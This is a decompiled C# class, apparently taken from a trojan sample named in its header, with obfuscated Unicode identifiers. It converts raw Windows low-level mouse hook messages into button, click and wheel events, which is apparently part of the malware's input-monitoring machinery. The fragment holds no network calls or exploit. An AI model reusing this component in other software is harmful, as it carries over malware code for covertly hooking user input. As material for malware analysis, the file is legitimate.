// Decompiled with JetBrains decompiler
// Type: 㰔윉翾燄쉇盈瑑喤짼쩬鰊뚀듙�⿩瀙
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class 㰔윉翾燄쉇盈瑑喤\uEDC4짼쩬鰊뚀듙\uFFFD\uF1A5\uE7C1\uE93F\u2FE9瀙 : MouseEventArgs
{
  internal 㰔윉翾燄쉇盈瑑喤\uEDC4짼쩬鰊뚀듙\uFFFD\uF1A5\uE7C1\uE93F\u2FE9瀙(
    MouseButtons buttons,
    int clicks,
    䙵\uEE5E㭲臟칵\uF04E\uF486礈篰뀺ラ\uFFFD䂐䪬꺱\u21B1\uE02A\uFFFD⃔脃 point,
    int delta,
    int timestamp,
    bool isMouseKeyDown,
    bool isMouseKeyUp)
    : base(buttons, clicks, point.\uFFFD跅䧭占명썎尮擛栚䣦\u2BCD췓\uFFFDꢋ\u0D5C㸪Ս\u2907필鈝, point.騾椕촆碪\u19F5蟗鐛\u323C豁祷깭᪶橛좛壅\u27FC\uE8C8皼椤\uA6F2, delta)
  {
    this.IsMouseKeyDown = isMouseKeyDown;
    this.IsMouseKeyUp = isMouseKeyUp;
    this.Timestamp = timestamp;
  }

  public bool Handled { get; set; }

  public bool WheelScrolled => this.Delta != 0;

  public bool Clicked => this.Clicks > 0;

  public bool IsMouseKeyDown { get; private set; }

  public bool IsMouseKeyUp { get; private set; }

  public int Timestamp { get; private set; }

  internal 䙵\uEE5E㭲臟칵\uF04E\uF486礈篰뀺ラ\uFFFD䂐䪬꺱\u21B1\uE02A\uFFFD⃔脃 Point => new 䙵\uEE5E㭲臟칵\uF04E\uF486礈篰뀺ラ\uFFFD䂐䪬꺱\u21B1\uE02A\uFFFD⃔脃(this.X, this.Y);

  internal static 㰔윉翾燄쉇盈瑑喤\uEDC4짼쩬鰊뚀듙\uFFFD\uF1A5\uE7C1\uE93F\u2FE9瀙 鵪汍뗐夒Ẍ옥ᨷ덑ꗬ\uFFFD\u3393늒в갿䯟\uFFFDⳅ\u298B\u336Bᢏ(
    㹴벀쀙麚针핒\uFFFD脡䭒톌䞅龵䆫죶楎čꔌ崭㥕淓 data)
  {
    return 㰔윉翾燄쉇盈瑑喤\uEDC4짼쩬鰊뚀듙\uFFFD\uF1A5\uE7C1\uE93F\u2FE9瀙.騌䙩\u2600\uFFFD괢멊䕿蚌咣쩺揲\uFFFD얒\uF578儘\uF389\uF32C䶧\uF474輸(data.WParam, ((ꋱ萌誊\u255C\uF649\uE6B5윑艕糈爔\u284B魵ꋲᵈ紺㦹\u16EC\u1362蚬돽) Marshal.PtrToStructure(data.LParam, typeof (ꋱ萌誊\u255C\uF649\uE6B5윑艕糈爔\u284B魵ꋲᵈ紺㦹\u16EC\u1362蚬돽))).䜭뷕\u3230䈦༢咉츲耡楤暻\uE034\u2216顀㹳\uE0CA\uE000\u26E1\uE359ڣ뺻());
  }

  internal static 㰔윉翾燄쉇盈瑑喤\uEDC4짼쩬鰊뚀듙\uFFFD\uF1A5\uE7C1\uE93F\u2FE9瀙 \uFFFD㒪Ⰼ摶ꌟ㖄츊㨓扮瘮칁霄甮㨼᩸\uEB1E併汄镔㦴(
    㹴벀쀙麚针핒\uFFFD脡䭒톌䞅龵䆫죶楎čꔌ崭㥕淓 data)
  {
    return 㰔윉翾燄쉇盈瑑喤\uEDC4짼쩬鰊뚀듙\uFFFD\uF1A5\uE7C1\uE93F\u2FE9瀙.騌䙩\u2600\uFFFD괢멊䕿蚌咣쩺揲\uFFFD얒\uF578儘\uF389\uF32C䶧\uF474輸(data.WParam, (䢫\u2F41ᳲ밡႘萃ೀ湨\uFFFDⰐ嶔幘\uFFD1噶雬ﳤ㬠\uE237ἒ\u2ADB) Marshal.PtrToStructure(data.LParam, typeof (䢫\u2F41ᳲ밡႘萃ೀ湨\uFFFDⰐ嶔幘\uFFD1噶雬ﳤ㬠\uE237ἒ\u2ADB)));
  }

  private static 㰔윉翾燄쉇盈瑑喤\uEDC4짼쩬鰊뚀듙\uFFFD\uF1A5\uE7C1\uE93F\u2FE9瀙 騌䙩\u2600\uFFFD괢멊䕿蚌咣쩺揲\uFFFD얒\uF578儘\uF389\uF32C䶧\uF474輸(
    IntPtr wParam,
    䢫\u2F41ᳲ밡႘萃ೀ湨\uFFFDⰐ嶔幘\uFFD1噶雬ﳤ㬠\uE237ἒ\u2ADB mouseInfo)
  {
    MouseButtons buttons = MouseButtons.None;
    short delta = 0;
    int clicks = 0;
    bool isMouseKeyDown = false;
    bool isMouseKeyUp = false;
    long num = (long) wParam - 513L;
    if ((ulong) num <= 13UL)
    {
      switch ((uint) num)
      {
        case 0:
          isMouseKeyDown = true;
          buttons = MouseButtons.Left;
          clicks = 1;
          break;
        case 1:
          isMouseKeyUp = true;
          buttons = MouseButtons.Left;
          clicks = 1;
          break;
        case 2:
          isMouseKeyDown = true;
          buttons = MouseButtons.Left;
          clicks = 2;
          break;
        case 3:
          isMouseKeyDown = true;
          buttons = MouseButtons.Right;
          clicks = 1;
          break;
        case 4:
          isMouseKeyUp = true;
          buttons = MouseButtons.Right;
          clicks = 1;
          break;
        case 5:
          isMouseKeyDown = true;
          buttons = MouseButtons.Right;
          clicks = 2;
          break;
        case 6:
          isMouseKeyDown = true;
          buttons = MouseButtons.Middle;
          clicks = 1;
          break;
        case 7:
          isMouseKeyUp = true;
          buttons = MouseButtons.Middle;
          clicks = 1;
          break;
        case 8:
          isMouseKeyDown = true;
          buttons = MouseButtons.Middle;
          clicks = 2;
          break;
        case 9:
          delta = mouseInfo.뱷敀烾쁃\uF2AC㜬咼\uFFFD㐙េ랳Ꭰ婄莻\uFFFD楇糜襒\u2603\u2868;
          break;
        case 10:
          buttons = mouseInfo.뱷敀烾쁃\uF2AC㜬咼\uFFFD㐙េ랳Ꭰ婄莻\uFFFD楇糜襒\u2603\u2868 == (short) 1 ? MouseButtons.XButton1 : MouseButtons.XButton2;
          isMouseKeyDown = true;
          clicks = 1;
          break;
        case 11:
          buttons = mouseInfo.뱷敀烾쁃\uF2AC㜬咼\uFFFD㐙េ랳Ꭰ婄莻\uFFFD楇糜襒\u2603\u2868 == (short) 1 ? MouseButtons.XButton1 : MouseButtons.XButton2;
          isMouseKeyUp = true;
          clicks = 1;
          break;
        case 12:
          isMouseKeyDown = true;
          buttons = mouseInfo.뱷敀烾쁃\uF2AC㜬咼\uFFFD㐙េ랳Ꭰ婄莻\uFFFD楇糜襒\u2603\u2868 == (short) 1 ? MouseButtons.XButton1 : MouseButtons.XButton2;
          clicks = 2;
          break;
        case 13:
          delta = mouseInfo.뱷敀烾쁃\uF2AC㜬咼\uFFFD㐙េ랳Ꭰ婄莻\uFFFD楇糜襒\u2603\u2868;
          break;
      }
    }
    return new 㰔윉翾燄쉇盈瑑喤\uEDC4짼쩬鰊뚀듙\uFFFD\uF1A5\uE7C1\uE93F\u2FE9瀙(buttons, clicks, mouseInfo.塋７\uFFFDᩲ叞ꥳ楳楲暈ୌ\u2B15\uEE16龗恺\uE493Ấ\uFFFD\uEB4E髅\uE613, (int) delta, mouseInfo.ꀖ頤稬\u2647᳞旅䣰燋\u2841ㆃɪ볠蚿싟\uFFFD鏏彻\uE416舖䐎, isMouseKeyDown, isMouseKeyUp);
  }

  internal 㰔윉翾燄쉇盈瑑喤\uEDC4짼쩬鰊뚀듙\uFFFD\uF1A5\uE7C1\uE93F\u2FE9瀙 㡵\u2EC0歟૨\uA7E3歊\uFFFD퉹\uE1D6\uFFFD붎贱悀淙ꎜꋦĒ姮툸뤸() => new 㰔윉翾燄쉇盈瑑喤\uEDC4짼쩬鰊뚀듙\uFFFD\uF1A5\uE7C1\uE93F\u2FE9瀙(this.Button, 2, this.Point, this.Delta, this.Timestamp, this.IsMouseKeyDown, this.IsMouseKeyUp);
}
